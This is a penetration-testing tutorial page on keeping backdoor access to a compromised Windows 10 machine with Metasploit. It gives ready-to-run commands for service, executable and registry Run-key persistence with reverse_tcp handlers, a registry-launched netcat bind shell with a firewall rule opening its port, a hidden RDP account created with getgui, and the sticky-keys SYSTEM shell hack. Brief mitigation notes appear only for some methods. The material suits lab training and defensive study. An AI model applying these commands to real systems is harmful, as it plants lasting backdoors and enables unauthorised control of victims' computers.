<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
            <h1 class="post-title entry-title">Multiple Ways to Persistence on Windows 10 with Metasploit</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/" rel="bookmark"><time class="entry-date published" datetime="2020-01-26T16:31:37+00:00">January 26, 2020</time><time class="updated" datetime="2025-05-12T21:17:39+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, you will learn the multiple ways to maintain access or create a persistent backdoor with the help of the Metasploit Framework on the host machine, which you have compromised.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;">Persistence Backdoor</span></p>
<p><span style="color: #000000;">Pre-requisites</span></p>
<p><span style="color: #000000;">Methods for Generating persistence using Metasploit</span></p>
<ul>
<li><span style="color: #000000;">Service Persistence</span></li>
<li><span style="color: #000000;">Mitigation method for persistence_service exploit.</span></li>
<li><span style="color: #000000;">Persistence_exe</span></li>
<li><span style="color: #000000;">Mitigation method for persistence_exe exploit.</span></li>
<li><span style="color: #000000;">Registry_persistence</span></li>
<li><span style="color: #000000;">Mitigation method for Registry_persistence exploit.</span></li>
<li><span style="color: #000000;">Persistence through Netcat.</span></li>
<li><span style="color: #000000;">Persistence through Remote Desktop Protocol.</span></li>
</ul>
<p><span style="color: #000000;"> Conclusion</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Persistence Backdoor</span> </span></h3>
<p><span style="color: #000000;">The term <strong data-start="9" data-end="24">Persistence</strong> refers to maintaining long-term access to a compromised system. In this post, we will share multiple methods to generate a permanent backdoor within a victim machine.</span></p>
<p class="" data-start="195" data-end="520"><span style="color: #000000;">Exploiting a system requires significant effort, and once an attacker gains access, it is crucial to maintain it for further examination or penetration. However, if the victim shuts down the system or changes their credentials, the attacker can lose all that effort. This is why maintaining access is a critical phase of penetration testing.</span></p>
<p class="" data-start="522" data-end="732"><span style="color: #000000;">Persistence includes a set of techniques that adversaries use to retain access to compromised systems, even across restarts, credential changes, and other interruptions that might otherwise sever their control.</span></p>
<h3><span style="color: #800000;">Pre-requisites</span></h3>
<p><span style="color: #000000;"><strong>Window 10</strong> -Victim System</span></p>
<p><span style="color: #000000;"><strong>Kali Linux</strong> – Attacker (Metasploit Framework)</span></p>
<p><span style="color: #000000;"><strong data-start="0" data-end="9" data-is-only-node="">Note:</strong> To create a persistent backdoor, you must have a compromised victim machine with an active <strong data-start="101" data-end="116">Meterpreter</strong> session. This is essential to follow all the practices discussed in this post.</span></p>
<h3><span style="color: #800000;">Methods for Generating Persistence Using Metasploit</span></h3>
<p><span style="color: #000000;">Let’s start, we already have compromised the window 10 (victim’s PC) and have meterpreter session along with the admin rights. To know how to get admin access click <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/">here</a></strong></span>. Now, we want to leave a permanent backdoor in the victim system that will provide a reverse connection for the next time.</span></p>
<h4><span style="color: #800000;">Service Persistence</span></h4>
<p><span style="color: #000000;">This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.</span></p>
<p><span style="color: #000000;">Thus, we will run the following commands on Kali Linux to run the above-listed module:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/persistence_service
set session 2
set lport 5678
exploit</pre>
<p><span style="color: #000000;">Above said module which will generate and upload an executable on the victim’s system under the /temp directory as  “lVFC.exe” and will make it a persistence service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pZeUMPV-f40/Xi24L7q_M1I/AAAAAAAAifg/DNwWGyPyJzc-TMbTJm7P8Ryu6Sm0xP1sQCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">If the victim reboots the system, the previous meterpreter session will be closed. Only we need to set up the multi handler to run the payload by using the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 5678
exploit</pre>
<p><span style="color: #000000;">Once the victim system starts, automatically we will gain the meterpreter session again.</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Z4C3DJsaVFs/Xi24ORf2g9I/AAAAAAAAigE/ujqFb8O7LJghCFEYaQKr1AbrSm8Pqy6zACLcBGAsYHQ/s1600/3.png" alt="Windows 10 Persistence with Metasploit" width="688" height="413"/></span></p>
<p><span style="color: #000000;">When the PC is started automatically some of its services starts by default so persistence_service exploit creates a new service that will start the payload whenever the service is running. In the below image you can see the executable file IVFC.exe is running under username System and we can verify its path.</span></p>
<p><span style="color: #000000;">C:/Windows/Temp/IVFC.exe</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F3csNbwi2T4/Xi24Osm1WmI/AAAAAAAAigI/2M2jIa4SxOUWmlUY5qN_dnKckQyar_SDQCLcBGAsYHQ/s1600/4.png"/></span></p>
<h4><span style="color: #800000;">Mitigation method for persistence_service exploit</span></h4>
<p><span style="color: #000000;">First of all, identify the unfamiliar files which are running and then stop the running executable format file i.e. IVFC.exe and delete it from the temp directory.</span></p>
<h4><span style="color: #800000;">Persistence_exe </span></h4>
<p><span style="color: #000000;">This is the second method to maintain access to the victim’s PC. Under this scenario, we already have meterpreter session of the victim’s PC and it has user access.</span></p>
<p><span style="color: #000000;">This module will upload an executable to the victim’s system and make it persistent. It can be installed as a user, system or service. We will use this module by using the session 1(already compromised system’session) and set the rexpath (remote executable path), through this payload file will create on victim’s PC but due to persistence script, it will save under temp directory with default.exe name(change the name under rexname option ) and will set it to autorun under the registry path mentioned in below image.</span></p>
<p><span style="color: #000000;"> To run this module, type the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/manage/persistence_exe
set session 1
set rexepath /root/payload.exe
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-HyjeaMCc5LE/Xi24OjHwKCI/AAAAAAAAigM/-Y0JKQZ1rqUpdwSMMRgoRuqbvjMOXE8UwCLcBGAsYHQ/s1600/5.png" alt="Windows 10 Persistence with Metasploit" width="822" height="315"/></span></p>
<p><span style="color: #000000;">After, successful execution of the above module, now we have to set up the multi handle by using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 1234
exploit</pre>
<p><span style="color: #000000;">Once the victim reboots its PC and the login into it, automatically we will get the meterpreter session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6jQGxA3wYZU/Xi24OyUEZhI/AAAAAAAAigQ/VfpcxmUJGJschNcJrfcbmthsJgl1LIq_wCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">In the below image you can see the function of persistence_exe, which will create the autorun service under the registry editor path:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO</pre>
<p><span style="color: #000000;">due to which service will start running as soon as the victim’s PC starts. </span><span style="color: #000000;">Its default file creates under the temp directory.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-wBuZgiLWtLQ/Xi24PDo_3BI/AAAAAAAAigU/GkASTknTLhoPb8wBb9ACwFEOi1MBG-POgCLcBGAsYHQ/s1600/7.png" alt="Windows 10 Persistence with Metasploit" width="1044" height="508"/></strong></span></p>
<h4><span style="color: #800000;">Mitigation Method for Persistence_exe</span></h4>
<p><span style="color: #000000;">First, remove the entry from the registry editor under the path:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO</pre>
<p><span style="color: #000000;">And then delete the executable payload file under the temp directory and reboot the system.</span></p>
<h4><span style="color: #800000;">Registry Persistence</span></h4>
<p class="" data-start="0" data-end="256"><span style="color: #000000;">The Windows registry is a core component of the operating system and contains a vast amount of raw data. Attackers often target the registry to hook their malicious code, as this approach makes it harder for traditional scans to detect suspicious activity.</span></p>
<p class="" data-start="258" data-end="575"><span style="color: #000000;">This module installs a payload that executes during the boot process. It can run either at user logon or system startup, depending on the privileges and method selected. This is achieved by adding a registry value in the <strong data-start="479" data-end="503">“CurrentVersion\Run”</strong> key, allowing the payload to be installed entirely within the registry.</span></p>
<p><span style="color: #000000;">Since we already have compromised the victim’s Pc and have the meterpreter session along with the user privileges. Use the following command to execute the registry persistence.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/registry_persistence
set session 1
set lport 7654
exploit</pre>
<p><span style="color: #000000;">Once the exploit is executed, it will create a registry key under HKCU\software\wl4cN9w and installed key as highlighted in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zySYcy1yWjo/Xi24Pb-p5VI/AAAAAAAAigY/x8DKOnRtTOEFJYk2JprjPUtg2SGTMjBOgCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">If the victim reboots the system, the <strong data-start="38" data-end="53">Meterpreter</strong> session will terminate. To regain access, simply set up the <strong data-start="114" data-end="131">multi/handler</strong> payload and execute it again.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 7654
exploit</pre>
<p><span style="color: #000000;">Once the victim’s machine starts and the victim logs into the system, the attacker will automatically receive a <strong data-start="112" data-end="127">Meterpreter</strong> session again. This is because the autorun script, installed in the registry by the attacker, will execute on startup. As a result, the registry persistence has been successfully established.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-0PGV-6Y1eII/Xi24P-x1L7I/AAAAAAAAigc/oE9DrUrZT6ExOJq8YWF_XDCcBJax8wvJQCLcBGAsYHQ/s1600/9.png" alt="Windows 10 Persistence with Metasploit" width="703" height="407"/></span></p>
<p><span style="color: #000000;">Through the below image you can verify the path of registry key created by registry_persistence exploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3bYo7FbDNxM/Xi24L6ro3rI/AAAAAAAAifo/Ah212b1PrY05DDo91z81Rf_mT6Htao3RACLcBGAsYHQ/s1600/10.png"/></span></p>
<h4><span style="color: #800000;">Persistence through Netcat</span></h4>
<p><span style="color: #000000;">Netcat or nc is a utility tool that uses TCP and UDP connections to read and write in a network. It can be used for both attack and security. In the case of attack, it can be driven by scripts which makes it quite dependable back-end and if we talk about security, it helps us to debug the network along with investing it. To read more about netcat please refer <a style="color: #000000;" href="https://www.hackingarticles.in/comprehensive-guide-on-netcat/">https://www.hackingarticles.in/comprehensive-guide-on-netcat/</a>.</span></p>
<p><span style="color: #000000;">Now we are going to make a persistence Netcat backdoor on the compromised system. As we already have meterpreter session, upload netcat.exe into system32 file of victim’s pc by using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-WF40gKw5wbw/Xi24L4-8UYI/AAAAAAAAifk/lVs-u6FXavQhu-V4sT-XyLHcUib1Q1hhwCLcBGAsYHQ/s1600/11.png" alt="Windows 10 Persistence with Metasploit" width="760" height="63"/></span></p>
<p><span style="color: #000000;">The next step is to set the netcat to listen on the random port i.e.4445, open the port on startup and make the connection.</span></p>
<p><span style="color: #000000;">Use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'</pre>
<p><span style="color: #000000;">On successful netcat connection, we get the shell of the victim’s PC.</span></p>
<p><span style="color: #000000;">We will add the new rule in the firewall named as ‘netcat’ in which inbound connection will allow for port 4445 by using the interactive cmd prompt running a command called netsh. Type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445</pre>
<p><span style="color: #000000;">To check the operational mode and port status run the command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netsh firewall show portopening</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VwMuccqb4Pk/Xi24M7DbwYI/AAAAAAAAifs/jJXUhNDQuyQnf_9vQxH5EkoM4K1CDcNFQCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">When the victim reboots the system again, we will get the netcat shell. On Kali Linux(attacker system) run the following command to connect our netcat backdoor via port 4445.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -nv 192.168.0.142 4445</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-yrQ5COx2gI0/Xi24M7ZIRYI/AAAAAAAAifw/2JiBmoBncJgOVtFObMNj48RKH6vhtjDeQCLcBGAsYHQ/s1600/13.png" alt="Windows 10 Persistence with Metasploit" width="558" height="177"/></span></p>
<h4><span style="color: #800000;">Persistence through RDP</span></h4>
<p><span style="color: #000000;">After having the meterpreter session of the already compromised targeted system. We will utilize Carlos Perez’s <strong>getgui </strong>script which enables Remote Desktop and creates a user account to login to it.</span></p>
<p><span style="color: #000000;"><strong>Username: Nisha</strong></span></p>
<p><span style="color: #000000;"><strong>Password: 123</strong></span></p>
<p><span style="color: #000000;">Run the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">run getgui -e -u nisha -p 123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hOfOQgNjiH0/Xi24NDf9cnI/AAAAAAAAif0/fkyO4xHFtdUerD3WN56uTiwYKE5lcka2gCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">With the help of the following module, it is possible to apply the ‘sticky keys’ hack to a session with appropriate rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP login screen or via a UAC confirmation dialog.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/manage/sticky_keys
set session 2
exploit</pre>
<p><span style="color: #000000;">As you can see here that we sticky is added successfully, now to launch the exploit at an RDP or UAC by press shift key 5 times.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-3mD7VhzW4y4/Xi24NWFirkI/AAAAAAAAif4/O0HAW9_jDRIM3MBjK89KjWZf0cc8McvxQCLcBGAsYHQ/s1600/15.png" alt="Windows 10 Persistence with Metasploit" width="967" height="164"/></span></p>
<p><span style="color: #000000;">Now we will check the connection using rdesktop and review the certificate and type <strong>Yes</strong>. By using the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rdesktop 192.168.0.142</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K5HtdUcBvMw/Xi24Nh4QKHI/AAAAAAAAif8/gipr9vb8aaMP-h0InCKLKFo3juAS9Uw4gCLcBGAsYHQ/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Congrats !!! finally we get the Gui mode of the victim’s system.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-3nP6CybmaQM/Xi24N3gLR-I/AAAAAAAAigA/8-nFUTKvgDsgZEGszWHu8peT8qxhPrTpwCLcBGAsYHQ/s1600/17.jpg" alt="Windows 10 Persistence with Metasploit" width="1029" height="631"/></span></p>
<h3><span style="color: #000000;"> <span style="color: #800000;">Conclusion</span></span></h3>
<p><span style="color: #000000;">Persistence does not require any authentication to connect with the victim’s system. To complete the penetration testing, always remember to clean up the processes and the backdoor services on the victim’s host.</span></p>
<p><span style="color: #000000;">To learn more about Windows Persistence. Follow this <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/tag/windows-persistence/">Link.</a></strong></span></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Nisha Sharma is a certified ethical hacker and skilled bug bounty hunter, specializing in cybersecurity and vulnerability assessment. Connect with her <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/nishasharmaa"><strong>here</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
